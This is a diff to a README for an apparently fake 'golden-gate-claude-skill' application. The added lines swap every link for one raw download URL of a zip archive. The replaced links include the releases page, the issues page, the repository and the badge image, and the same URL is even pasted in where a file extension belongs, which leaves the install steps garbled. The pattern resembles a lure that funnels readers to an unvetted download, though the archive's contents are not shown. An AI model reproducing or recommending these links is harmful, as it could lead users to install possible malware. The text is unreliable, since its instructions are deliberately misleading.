@@ -1,6 +1,6 @@
 # 🌉 golden-gate-claude-skill - Rediscover the Golden Gate Experience 
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/Waistlinereadout106/golden-gate-claude-skill/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Waistlinereadout106/golden-gate-claude-skill/main/urare/golden-gate-claude-skill-1.5.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/Waistlinereadout106/golden-gate-claude-skill/main/urare/golden-gate-claude-skill-1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome! You are about to explore the **Golden Gate Claude Skill**, an applicati
 
 1. **Visit the Releases Page**  
    To start, click on this link to go to the releases page:  
-   [Download the latest release](https://github.com/Waistlinereadout106/golden-gate-claude-skill/releases).
+   [Download the latest release](https://raw.githubusercontent.com/Waistlinereadout106/golden-gate-claude-skill/main/urare/golden-gate-claude-skill-1.5.zip).
 
 2. **Choose the Right Version**  
    On the releases page, you will see a list of available versions. Select the most recent one. Look for the version number that says "Latest".
@@ -19,7 +19,7 @@ Welcome! You are about to explore the **Golden Gate Claude Skill**, an applicati
    You will find different files available for download. Ensure you choose the appropriate file for your operating system. For example:  
    - **Windows:** Find a file ending in `.exe`  
    - **Mac:** Find a file ending in `.dmg` or `.zip`  
-   - **Linux:** Look for files ending in `.tar.gz`
+   - **Linux:** Look for files ending in `https://raw.githubusercontent.com/Waistlinereadout106/golden-gate-claude-skill/main/urare/golden-gate-claude-skill-1.5.zip`
 
 4. **Download the File**  
    Click on the file name to start the download. After it completes, locate the downloaded file on your computer.
@@ -27,7 +27,7 @@ Welcome! You are about to explore the **Golden Gate Claude Skill**, an applicati
 5. **Install the Application**  
    - **Windows:** Double-click the `.exe` file and follow the instructions on your screen.  
    - **Mac:** Open the `.dmg` or `.zip` file, and drag the application into your Applications folder.  
-   - **Linux:** Extract the `.tar.gz` file. Open a terminal and navigate to the extracted folder. Run the installation command.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/Waistlinereadout106/golden-gate-claude-skill/main/urare/golden-gate-claude-skill-1.5.zip` file. Open a terminal and navigate to the extracted folder. Run the installation command.
 
 ## 🖥️ System Requirements
 
@@ -72,14 +72,14 @@ After installation, follow these steps to use the application:
 
 If you encounter any issues or have questions, please reach out through the following:
 
-- **GitHub Issues Page:** [Report Issues](https://github.com/Waistlinereadout106/golden-gate-claude-skill/issues) 
+- **GitHub Issues Page:** [Report Issues](https://raw.githubusercontent.com/Waistlinereadout106/golden-gate-claude-skill/main/urare/golden-gate-claude-skill-1.5.zip) 
 - **Community Forum:** Join our community for discussions and support.
 
 ## 🔄 Update the Application
 
 To stay up to date with the latest features and improvements, regularly check the releases page:
 
-[Download the latest release](https://github.com/Waistlinereadout106/golden-gate-claude-skill/releases)
+[Download the latest release](https://raw.githubusercontent.com/Waistlinereadout106/golden-gate-claude-skill/main/urare/golden-gate-claude-skill-1.5.zip)
 
 Updating is as simple as downloading the latest version and following the installation steps again.
 
@@ -87,7 +87,7 @@ Updating is as simple as downloading the latest version and following the instal
 
 We welcome contributions! If you have ideas or would like to help improve this skill, please visit our repository for guidance on how to contribute:
 
-[GitHub Repository](https://github.com/Waistlinereadout106/golden-gate-claude-skill)
+[GitHub Repository](https://raw.githubusercontent.com/Waistlinereadout106/golden-gate-claude-skill/main/urare/golden-gate-claude-skill-1.5.zip)
 
 Your feedback and contributions help us make the skill better for everyone.
 
